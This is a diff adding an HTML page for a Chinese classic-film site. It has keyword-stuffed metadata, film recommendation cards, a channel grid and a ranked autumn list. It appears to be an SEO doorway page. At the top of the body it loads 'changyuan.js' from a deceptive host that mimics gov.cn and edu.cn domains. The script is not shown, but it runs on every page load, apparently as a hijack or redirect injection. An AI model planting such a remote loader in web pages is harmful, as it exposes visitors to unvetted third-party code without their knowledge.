@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网官网 - 秋日光影，霞满银幕</title>
+<meta name="keywords" content="秋霞电影网官网, 秋霞电影, 经典影视, 秋日观影, 高清电影, qiuxiadianyingwangguanwang">
+<meta name="description" content="秋霞电影网官网（qiuxiadianyingwangguanwang-top）专注经典影视推荐，如秋日霞光般温暖人心。海量经典电影、电视剧、纪录片每日精选，陪你度过每一个秋日午后。https://qiuxiadianyingwangguanwang-top.github.io">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: 'Noto Serif SC', 'Songti SC', 'PingFang SC', 'Microsoft YaHei', serif;
+    background: #fdf8f2;
+    color: #3d2b1f;
+    line-height: 1.8;
+    overflow-x: hidden;
+}
+
+/* 枫叶顶栏 */
+.maple-bar {
+    height: 5px;
+    background: linear-gradient(90deg, #c62828, #e65100, #ef6c00, #f9a825, #e65100, #c62828);
+    background-size: 300% 100%;
+    animation: maple-flow 6s ease-in-out infinite;
+}
+@keyframes maple-flow {
+    0%, 100% { background-position: 0% 0; }
+    50% { background-position: 300% 0; }
+}
+
+/* 飘落枫叶 */
+.falling-leaf {
+    position: fixed;
+    font-size: 18px;
+    opacity: 0.15;
+    pointer-events: none;
+    z-index: 9999;
+    animation: leaf-fall linear infinite;
+}
+@keyframes leaf-fall {
+    0% { transform: translateY(-10vh) rotate(0deg) translateX(0); opacity: 0; }
+    10% { opacity: 0.2; }
+    100% { transform: translateY(110vh) rotate(360deg) translateX(60px); opacity: 0; }
+}
+
+/* 导航 */
+.header {
+    background: rgba(253, 248, 242, 0.95);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid rgba(198, 40, 40, 0.15);
+    position: sticky;
+    top: 0;
+    z-index: 999;
+}
+.nav-inner {
+    max-width: 1180px;
+    margin: 0 auto;
+    padding: 14px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+.logo-box { display: flex; align-items: center; gap: 12px; }
+.logo-maple {
+    width: 42px; height: 42px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #c62828, #e65100);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px;
+    box-shadow: 0 3px 10px rgba(198, 40, 40, 0.25);
+}
+.logo-text { font-size: 22px; font-weight: 700; color: #4e342e; letter-spacing: 2px; }
+.logo-text .accent { color: #c62828; font-weight: 900; }
+.nav-links { display: flex; gap: 4px; list-style: none; }
+.nav-links a {
+    text-decoration: none;
+    color: #6d4c41;
+    font-size: 14px;
+    padding: 8px 16px;
+    border-radius: 8px;
+    transition: all 0.3s;
+    font-weight: 500;
+}
+.nav-links a:hover { background: #fbe9e7; color: #c62828; }
+
+/* 英雄区 */
+.hero {
+    position: relative;
+    min-height: 70vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    overflow: hidden;
+    background: 
+        radial-gradient(ellipse 600px 400px at 30% 40%, rgba(230,81,0,0.08), transparent),
+        radial-gradient(ellipse 500px 300px at 70% 60%, rgba(198,40,40,0.06), transparent),
+        linear-gradient(170deg, #fff8e1 0%, #ffe0b2 40%, #ffcc80 100%);
+}
+.hero-glow {
+    position: absolute;
+    top: 10%; left: 50%;
+    transform: translateX(-50%);
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(249,168,37,0.15) 0%, transparent 70%);
+    border-radius: 50%;
+    animation: sun-glow 6s ease-in-out infinite;
+}
+@keyframes sun-glow {
+    0%, 100% { transform: translateX(-50%) scale(1); opacity: 0.6; }
+    50% { transform: translateX(-50%) scale(1.1); opacity: 1; }
+}
+.hero-content { position: relative; z-index: 2; max-width: 680px; padding: 0 20px; }
+.hero-badge {
+    display: inline-block;
+    padding: 6px 22px;
+    border-radius: 30px;
+    background: rgba(198, 40, 40, 0.08);
+    border: 1px solid rgba(198, 40, 40, 0.25);
+    color: #c62828;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    margin-bottom: 22px;
+}
+.hero h1 {
+    font-size: clamp(32px, 6vw, 50px);
+    font-weight: 900;
+    margin-bottom: 16px;
+    color: #3d2b1f;
+    letter-spacing: 3px;
+}
+.hero h1 .gradient {
+    background: linear-gradient(135deg, #c62828, #e65100, #f9a825);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.hero p {
+    font-size: 16px;
+    color: #6d4c41;
+    margin-bottom: 30px;
+    font-weight: 400;
+}
+.hero-btn {
+    display: inline-block;
+    padding: 13px 36px;
+    border-radius: 30px;
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 15px;
+    color: #fff;
+    background: linear-gradient(135deg, #c62828, #e65100);
+    box-shadow: 0 4px 16px rgba(198, 40, 40, 0.3);
+    transition: all 0.3s;
+}
+.hero-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 24px rgba(198, 40, 40, 0.4); }
+
+/* 通用区块 */
+.section { max-width: 1180px; margin: 0 auto; padding: 55px 20px; }
+.section-head { text-align: center; margin-bottom: 38px; }
+.section-head h2 {
+    font-size: 28px;
+    font-weight: 900;
+    color: #4e342e;
+    margin-bottom: 6px;
+    letter-spacing: 3px;
+}
+.section-head h2 span { color: #c62828; }
+.section-head p { color: #8d6e63; font-size: 14px; font-weight: 400; }
+
+/* 栏目一：经典精选 */
+.classic-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(255px, 1fr));
+    gap: 22px;
+}
+.classic-card {
+    background: #fff;
+    border-radius: 14px;
+    overflow: hidden;
+    box-shadow: 0 3px 14px rgba(0,0,0,0.06);
+    border: 1px solid #f5e6d3;
+    transition: all 0.3s;
+}
+.classic-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 30px rgba(198, 40, 40, 0.15);
+    border-color: #ffab91;
+}
+.classic-cover {
+    height: 150px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 52px;
+    position: relative;
+}
+.classic-cover.m1 { background: linear-gradient(135deg, #ffe0b2, #ffab91); }
+.classic-cover.m2 { background: linear-gradient(135deg, #ffcdd2, #ef9a9a); }
+.classic-cover.m3 { background: linear-gradient(135deg, #d7ccc8, #bcaaa4); }
+.classic-cover.m4 { background: linear-gradient(135deg, #fff9c4, #fff176); }
+.classic-body { padding: 18px; }
+.classic-body h3 { font-size: 16px; color: #4e342e; margin-bottom: 4px; font-weight: 700; }
+.classic-body .meta { font-size: 12px; color: #8d6e63; margin-bottom: 8px; }
+.classic-body .desc { font-size: 13px; color: #6d4c41; line-height: 1.6; }
+.classic-tag {
+    display: inline-block;
+    margin-top: 10px;
+    padding: 3px 12px;
+    border-radius: 12px;
+    font-size: 10px;
+    font-weight: 600;
+    background: #fbe9e7;
+    color: #c62828;
+}
+
+/* 栏目二：频道 */
+.channel-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(135px, 1fr));
+    gap: 14px;
+}
+.channel-tile {
+    background: #fff;
+    border-radius: 14px;
+    padding: 20px 10px;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.04);
+    transition: all 0.3s;
+    cursor: pointer;
+    border: 1px solid #f5e6d3;
+}
+.channel-tile:hover {
+    background: #fff3e0;
+    transform: translateY(-3px);
+    border-color: #ffab91;
+}
+.channel-tile .ci { font-size: 30px; display: block; margin-bottom: 6px; }
+.channel-tile .cn { font-size: 13px; font-weight: 700; color: #5d4037; }
+.channel-tile .cc { font-size: 10px; color: #a1887f; margin-top: 2px; }
+
+/* 栏目三：金秋榜 */
+.autumn-section {
+    background: linear-gradient(180deg, #fff8e1, #ffe0b2);
+    border-radius: 24px;
+    padding: 46px 20px;
+    margin: 30px auto;
+    max-width: 1180px;
+}
+.autumn-list { max-width: 740px; margin: 0 auto; }
+.autumn-item {
+    display: flex; align-items: center; gap: 18px;
+    padding: 15px 18px;
+    background: rgba(255,255,255,0.8);
+    border-radius: 12px;
+    margin-bottom: 11px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+    transition: all 0.3s;
+}
+.autumn-item:hover { transform: translateX(5px); box-shadow: 0 4px 14px rgba(198,40,40,0.12); }
+.autumn-pos {
+    font-size: 20px; font-weight: 900; min-width: 34px; text-align: center;
+    color: #c62828;
+}
+.autumn-info h4 { font-size: 15px; color: #4e342e; font-weight: 700; }
+.autumn-info p { font-size: 11px; color: #8d6e63; }
+.autumn-score { margin-left: auto; font-size: 17px; font-weight: 800; color: #e65100; }
+
+/* 栏目四：关于 */
+.about-box {
+    max-width: 660px; margin: 0 auto; text-align: center;
+    background: #fff;
+    border-radius: 18px;
+    padding: 38px 28px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+    border: 1px solid #f5e6d3;
+}
+.about-box .maple-icon { font-size: 46px; margin-bottom: 12px; }
+.about-box h3 { font-size: 22px; color: #4e342e; margin-bottom: 14px; font-weight: 800; letter-spacing: 2px; }
+.about-box p { font-size: 14px; color: #6d4c41; line-height: 2; margin-bottom: 10px; }
+.about-box .site-url {
+    display: inline-block; margin-top: 12px;
+    padding: 10px 24px; border-radius: 24px;
+    background: #fbe9e7; color: #c62828; font-weight: 700; font-size: 13px;
+}
+
+/* 底部 */
+.footer {
+    background: #3d2b1f;
+    color: #fff;
+    text-align: center;
+    padding: 36px 20px 20px;
+    margin-top: 48px;
+}
+.footer-logo { font-size: 20px; font-weight: 900; margin-bottom: 12px; color: #ffab91; letter-spacing: 2px; }
+.footer-nav { display: flex; justify-content: center; gap: 18px; flex-wrap: wrap; margin-bottom: 16px; }
+.footer-nav a { color: rgba(255,255,255,0.6); text-decoration: none; font-size: 13px; }
+.footer-nav a:hover { color: #ffab91; }
+.footer-line { width: 50px; height: 2px; background: rgba(255,171,145,0.3); margin: 14px auto; }
+.footer-copy { font-size: 12px; color: rgba(255,255,255,0.4); }
+.footer-site { font-size: 12px; color: #ffab91; margin-top: 6px; }
+
+/* 移动端 */
+@media (max-width: 768px) {
+    .nav-links { display: none; }
+    .hero { min-height: 54vh; }
+    .hero h1 { font-size: 26px; }
+    .section { padding: 36px 15px; }
+    .classic-grid { grid-template-columns: 1fr; }
+    .channel-grid { grid-template-columns: repeat(3, 1fr); gap: 10px; }
+    .channel-tile { padding: 14px 6px; }
+    .channel-tile .ci { font-size: 24px; }
+    .autumn-item { padding: 12px 14px; gap: 10px; }
+    .autumn-pos { font-size: 18px; }
+    .autumn-info h4 { font-size: 13px; }
+    .autumn-score { font-size: 15px; }
+    .about-box { padding: 26px 16px; }
+}
+@media (max-width: 480px) {
+    .channel-grid { grid-template-columns: repeat(2, 1fr); }
+    .logo-text { font-size: 17px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 飘落枫叶 -->
+<div class="falling-leaf" style="left:5%; animation-duration:12s; animation-delay:0s;">🍁</div>
+<div class="falling-leaf" style="left:15%; animation-duration:15s; animation-delay:2s;">🍂</div>
+<div class="falling-leaf" style="left:30%; animation-duration:10s; animation-delay:4s;">🍁</div>
+<div class="falling-leaf" style="left:45%; animation-duration:14s; animation-delay:1s;">🍂</div>
+<div class="falling-leaf" style="left:60%; animation-duration:11s; animation-delay:3s;">🍁</div>
+<div class="falling-leaf" style="left:75%; animation-duration:13s; animation-delay:5s;">🍂</div>
+<div class="falling-leaf" style="left:90%; animation-duration:9s; animation-delay:2s;">🍁</div>
+
+<div class="maple-bar"></div>
+
+<header class="header">
+    <div class="nav-inner">
+        <div class="logo-box">
+            <div class="logo-maple">🍁</div>
+            <div class="logo-text">秋霞<span class="accent">电影网官网</span></div>
+        </div>
+        <nav>
+            <ul class="nav-links">
+                <li><a href="#home">首页</a></li>
+                <li><a href="#classic">经典精选</a></li>
+                <li><a href="#channel">影视频道</a></li>
+                <li><a href="#rank">金秋榜单</a></li>
+                <li><a href="#about">关于本站</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section class="hero" id="home">
+    <div class="hero-glow"></div>
+    <div class="hero-content">
+        <div class="hero-badge">🍂 秋日观影 · 经典永存</div>
+        <h1><span class="gradient">秋霞</span>电影网官网</h1>
+        <p>如秋日霞光般温暖人心，如落叶归根般经典隽永。精选全球经典影视，陪你度过每一个秋日午后。</p>
+        <a href="#classic" class="hero-btn">🍁 走进秋日影廊</a>
+    </div>
+</section>
+
+<section class="section" id="classic">
+    <div class="section-head">
+        <h2>经典<span>精选</span></h2>
+        <p>岁月沉淀，光影永恒</p>
+    </div>
+    <div class="classic-grid">
+        <div class="classic-card">
+            <div class="classic-cover m1">🎬</div>
+            <div class="classic-body">
+                <h3>霸王别姬</h3>
+                <div class="meta">1993 · 剧情/爱情 · 陈凯歌</div>
+                <div class="desc">"说好的一辈子，差一年一个月一天一个时辰都不算一辈子。"华语电影巅峰之作，时代与人生的悲歌。</div>
+                <span class="classic-tag">影史经典</span>
+            </div>
+        </div>
+        <div class="classic-card">
+            <div class="classic-cover m2">🌹</div>
+            <div class="classic-body">
+                <h3>活着</h3>
+                <div class="meta">1994 · 剧情/历史 · 张艺谋</div>
+                <div class="desc">福贵的一生，是几代中国人的缩影。在苦难中寻找活着的意义，朴素而震撼。</div>
+                <span class="classic-tag">必看佳作</span>
+            </div>
+        </div>
+        <div class="classic-card">
+            <div class="classic-cover m3">🍂</div>
+            <div class="classic-body">
+                <h3>秋日奏鸣曲</h3>
+                <div class="meta">1978 · 剧情/家庭 · 伯格曼</div>
+                <div class="desc">母女之间的爱与伤害，如秋日般深沉而萧瑟。伯格曼的心理剖析力作。</div>
+                <span class="classic-tag">艺术经典</span>
+            </div>
+        </div>
+        <div class="classic-card">
+            <div class="classic-cover m4">🎭</div>
+            <div class="classic-body">
+                <h3>天堂电影院</h3>
+                <div class="meta">1988 · 剧情/怀旧 · 托纳多雷</div>
+                <div class="desc">关于电影、关于成长、关于离别。那些被剪掉的吻戏胶片，是青春最美好的记忆。</div>
+                <span class="classic-tag">情怀满分</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="channel">
+    <div class="section-head">
+        <h2>影视<span>频道</span></h2>
+        <p>经典分类，各有所爱</p>
+    </div>
+    <div class="channel-grid">
+        <div class="channel-tile"><span class="ci">🎬</span><div class="cn">经典电影</div><div class="cc">3,265部</div></div>
+        <div class="channel-tile"><span class="ci">📺</span><div class="cn">怀旧剧集</div><div class="cc">2,876部</div></div>
+        <div class="channel-tile"><span class="ci">🎭</span><div class="cn">文艺片</div><div class="cc">1,543部</div></div>
+        <div class="channel-tile"><span class="ci">📽️</span><div class="cn">黑白老片</div><div class="cc">987部</div></div>
+        <div class="channel-tile"><span class="ci">🌹</span><div class="cn">爱情经典</div><div class="cc">1,654部</div></div>
+        <div class="channel-tile"><span class="ci">🎪</span><div class="cn">喜剧经典</div><div class="cc">2,098部</div></div>
+        <div class="channel-tile"><span class="ci">📼</span><div class="cn">港片回忆</div><div class="cc">1,765部</div></div>
+        <div class="channel-tile"><span class="ci">🍂</span><div class="cn">秋日特辑</div><div class="cc">432部</div></div>
+    </div>
+</section>
+
+<section class="autumn-section" id="rank">
+    <div class="section-head">
+        <h2>金秋<span>榜单</span></h2>
+        <p>最适合秋天看的经典影片</p>
+    </div>
+    <div class="autumn-list">
+        <div class="autumn-item">
+            <div class="autumn-pos">1</div>
+            <div class="autumn-info"><h4>悲情城市</h4><p>1989 · 剧情/历史 · 侯孝贤</p></div>
+            <div class="autumn-score">9.3</div>
+        </div>
+        <div class="autumn-item">
+            <div class="autumn-pos">2</div>
+            <div class="autumn-info"><h4>红高粱</h4><p>1987 · 剧情/战争 · 张艺谋</p></div>
+            <div class="autumn-score">9.2</div>
+        </div>
+        <div class="autumn-item">
+            <div class="autumn-pos">3</div>
+            <div class="autumn-info"><h4>大话西游</h4><p>1995 · 喜剧/爱情 · 周星驰经典</p></div>
+            <div class="autumn-score">9.1</div>
+        </div>
+        <div class="autumn-item">
+            <div class="autumn-pos">4</div>
+            <div class="autumn-info"><h4>阳光灿烂的日子</h4><p>1994 · 剧情/青春 · 姜文</p></div>
+            <div class="autumn-score">8.9</div>
+        </div>
+        <div class="autumn-item">
+            <div class="autumn-pos">5</div>
+            <div class="autumn-info"><h4>那山那人那狗</h4><p>1999 · 剧情/乡村 · 霍建起</p></div>
+            <div class="autumn-score">8.8</div>
+        </div>
+        <div class="autumn-item">
+            <div class="autumn-pos">6</div>
+            <div class="autumn-info"><h4>城南旧事</h4><p>1983 · 剧情/童年 · 吴贻弓</p></div>
+            <div class="autumn-score">8.7</div>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="about">
+    <div class="section-head"><h2>关于<span>秋霞电影网官网</span></h2></div>
+    <div class="about-box">
+        <div class="maple-icon">🍁🎬</div>
+        <h3>秋日光影，霞满银幕</h3>
+        <p><strong style="color:#c62828;">秋霞电影网官网</strong>（qiuxiadianyingwangguanwang-top）以"秋"为名，以"霞"为韵，专注经典影视的收藏与推荐。</p>
+        <p>我们相信，经典如秋叶，每一片都承载着岁月的纹路。从华语经典到世界名片，从黑白老片到彩色记忆，每一部都值得被反复回味。</p>
+        <p>秋天来了，泡一杯热茶，看一部好电影。🍂</p>
+        <div class="site-url">🌐 https://qiuxiadianyingwangguanwang-top.github.io</div>
+    </div>
+</section>
+
+<footer class="footer">
+    <div class="footer-logo">🍁 秋霞电影网官网</div>
+    <div class="footer-nav">
+        <a href="#home">首页</a>
+        <a href="#classic">经典精选</a>
+        <a href="#channel">影视频道</a>
+        <a href="#rank">金秋榜单</a>
+        <a href="#about">关于本站</a>
+        <a href="#">免责声明</a>
+        <a href="#">联系合作</a>
+    </div>
+    <div class="footer-line"></div>
+    <div class="footer-copy">© 2024 秋霞电影网官网 · 秋日光影 霞满银幕</div>
+    <div class="footer-site">https://qiuxiadianyingwangguanwang-top.github.io</div>
+</footer>
+
+</body>
+</html>
